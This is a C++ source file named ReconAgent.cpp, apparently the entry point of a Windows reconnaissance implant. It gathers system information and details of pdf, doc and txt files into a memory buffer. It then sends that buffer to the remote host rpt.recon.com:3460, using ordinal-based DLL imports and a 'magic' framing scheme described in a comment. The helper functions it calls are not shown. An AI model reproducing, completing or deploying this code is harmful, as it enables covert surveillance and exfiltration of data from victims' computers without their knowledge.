// ReconAgent.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "ReconAgent.h"
#include "GetSysInfo.h"
#include "SendSysInfo.h"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    HANDLE hHeap = /*/kernel32.dll/*/GetProcessHeap();
    LPSTREAM pStrm2Send = /*/shlwapi.dll#12/*/SHCreateMemStream(0, 0);
    DWORD dwVersion = GetInfo(hHeap, pStrm2Send);
    GetIcons(hHeap, dwVersion, pStrm2Send, "pdf\0doc\0txt\0");
    ULARGE_INTEGER uiSize;
    /*/shlwapi.dll#214/*/IStream_Size(pStrm2Send, &uiSize);
    LPBYTE pBufNow = NULL, pBuf2Save = (LPBYTE)/*/kernel32.dll/*/HeapAlloc(hHeap, HEAP_ZERO_MEMORY, uiSize.LowPart);
    /*/shlwapi.dll#213/*/IStream_Reset(pStrm2Send);
    /*/shlwapi.dll#184/*/IStream_Read(pStrm2Send, pBuf2Save, uiSize.LowPart);
    /*/shlwapi.dll#169/*/IUnknown_AtomicRelease((LPVOID*)&pStrm2Send);
    //Local test, save files; remote test, send dwMagic[0]=dwSizeBuf, dwMagic[1]=LanIP, dwMagic[2]=Real Magic to Compare (dwMagic[3] & dwDummy are Random Bytes
    pBufNow = pBuf2Save;
    SendInfo(hHeap, (LPSTR)"rpt.recon.com:3460", pBuf2Save, uiSize.LowPart);
    /*/kernel32.dll/*/HeapFree(hHeap, 0, pBuf2Save);
    return 0;
}
